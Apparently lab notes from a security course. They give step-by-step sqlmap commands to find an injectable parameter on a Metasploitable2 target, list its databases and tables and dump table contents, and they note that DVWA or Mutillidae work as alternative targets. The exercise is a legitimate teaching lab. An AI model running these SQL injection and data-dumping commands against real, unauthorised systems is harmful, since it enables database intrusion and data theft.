#########Ensure Metasploitable2 and Kali are running and network is bridged.

#####3Get target IP:

ifconfig                                                # on Kali to confirm own IP
# on metasploitable: ifconfig


######In browser, open the vulnerable page on metasploitable to identify an injectable parameter (e.g., http://<target-ip>/vulnerable.php?id=1). (PDF shows using browser). 



Run sqlmap against the target URL (recommended concrete examples):

# basic run to test:
sqlmap -u "http://<target-ip>/vuln.php?id=1" --batch --level=2 --risk=1

# list databases:
sqlmap -u "http://<target-ip>/vuln.php?id=1" --dbs --batch

# list tables in a DB:
sqlmap -u "http://<target-ip>/vuln.php?id=1" -D <dbname> --tables --batch

# dump a table:
sqlmap -u "http://<target-ip>/vuln.php?id=1" -D <dbname> -T <table> --dump --batch


(The PDF instructs to paste the link with the sqlmap command and then inspect databases/tables/dump; exact flags were not always written in the PDF — these are standard, recommended sqlmap usages). 

SecurityPracticals

If sqlmap errors due to site error messages, fix configuration on metasploitable (PDF references editing config and saving). Example:

# edit config file on metasploitable (path may vary):
sudo nano /var/www/html/<app>/config.php
# save: Ctrl+O, Enter, Ctrl+X (as taught in PDF)


Then retry sqlmap. 



Test same against DVWA or Mutillidae after setting security levels to Low (GUI). Use same sqlmap commands adjusted to DVWA URL.
